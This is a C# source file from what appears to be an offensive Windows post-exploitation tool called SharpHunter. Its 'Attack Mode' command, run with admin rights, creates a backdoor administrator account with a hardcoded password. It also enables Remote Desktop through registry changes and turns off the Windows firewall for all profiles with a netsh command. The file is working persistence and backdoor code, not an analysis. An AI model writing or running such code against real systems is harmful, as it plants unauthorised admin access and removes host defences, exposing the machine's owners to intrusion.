using System.Collections.Generic;
using Microsoft.Win32;
using SharpHunter.Utils;

namespace SharpHunter.Commands

{
    class EnableRDPCommand : ICommand
    {
        public void Execute(List<string> args)
        {
            Logger.TaskHeader("Attack Mode", 1);
            if (!CommonUtils.IsAdminRight())
            {
                Logger.WriteLine("[-] Administrator privileges required!");
                return;
            }
            EnableRDP();
            //CloseRDP();
        }

        public static void EnableRDP()
        {
            Logger.WriteLine("[*] Enable RDP and create an administrator RDP user.\n");
            if (!CommonUtils.IsAdminRight())
            {
                Logger.WriteLine("[-] Administrator privileges required!");
                return;
            }

            AddUserCommand.AddUserToGroupsFast("Hunter", "Aa@123456", new string[] { "Administrators" });
            Logger.WriteLine("[+] Username: Hunter");
            Logger.WriteLine("[+] Password: Aa@123456");
            Logger.WriteLine("[+] Add administrator RDP users successfully! ");
            OpenRDP();
            ExecuteCmdCommand.RunCommand("netsh advfirewall set allprofiles state off");
        }


        public static void OpenRDP()
        {
            if (!CommonUtils.IsAdminRight())
            {
                return;
            }

            CommonUtils.ChangeRegistryKey(@"SYSTEM\CurrentControlSet\Control\Terminal Server", "fDenyTSConnections", 0, RegistryValueKind.DWord);
            CommonUtils.ChangeRegistryKey(@"SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile", "EnableRemoteAdmin", 1, RegistryValueKind.DWord);

            Logger.WriteLine("[+] RDP has been enabled successfully.");
        }

        public static void CloseRDP()
        {
            if (!CommonUtils.IsAdminRight())
            {
                return;
            }

            CommonUtils.ChangeRegistryKey(@"SYSTEM\CurrentControlSet\Control\Terminal Server", "fDenyTSConnections", 1, RegistryValueKind.DWord);
            CommonUtils.ChangeRegistryKey(@"SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile", "EnableRemoteAdmin", 0, RegistryValueKind.DWord);

            Logger.WriteLine("[+] RDP has been closed successfully.");
        }
    }
}
